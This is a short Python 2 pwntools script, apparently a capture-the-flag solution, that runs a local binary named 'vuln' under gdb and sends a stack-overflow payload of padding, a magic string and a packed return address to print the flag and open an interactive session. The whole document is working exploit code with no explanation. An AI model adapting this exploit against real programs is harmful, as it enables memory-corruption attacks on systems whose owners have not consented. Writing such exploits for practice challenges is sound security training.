#!/usr/bin/env python2

from pwn import *

elf = ELF('./vuln')
context.log_level = 'critical'
context.terminal = ['tmux', 'new-window']


p = process('./vuln')
gdb.attach(p)

p.sendlineafter('> ', '100')
p.sendafter('> ', 'A'*32 + 'wrvW' + 'A'*16 + p64(0x566517ed))

flag = p.recv()

print flag

p.interactive()
